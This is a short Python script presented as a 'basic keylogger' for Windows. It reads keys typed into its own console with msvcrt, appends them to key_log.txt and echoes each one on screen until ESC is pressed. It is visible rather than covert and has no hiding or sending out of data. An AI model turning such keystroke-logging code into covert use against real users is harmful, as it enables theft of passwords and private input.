import msvcrt
import time
import os

# ANSI color codes
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RED = "\033[91m"
RESET = "\033[0m"

# File to log keystrokes
log_file = "key_log.txt"

# Show header
os.system("cls")
print(f"""{YELLOW}
╔══════════════════════════════════════════╗
║         🔐 BASIC PYTHON KEYLOGGER        ║
║        {CYAN}Press ESC to stop logging...{YELLOW}      ║
╚══════════════════════════════════════════╝
{RESET}""")

# Start logging
with open(log_file, "a") as f:
    while True:
        if msvcrt.kbhit():
            key = msvcrt.getch()
            if key == b'\x1b':  # ESC key
                print(f"{RED}\n\n[!] Exiting... Keylogger stopped.{RESET}")
                break
            try:
                decoded = key.decode("utf-8")
                f.write(decoded)
                print(f"{GREEN}[+] Key logged: {decoded}{RESET}")
            except:
                f.write(f"[{key}]")
                print(f"{CYAN}[+] Special key logged: {key}{RESET}")
        time.sleep(0.01)
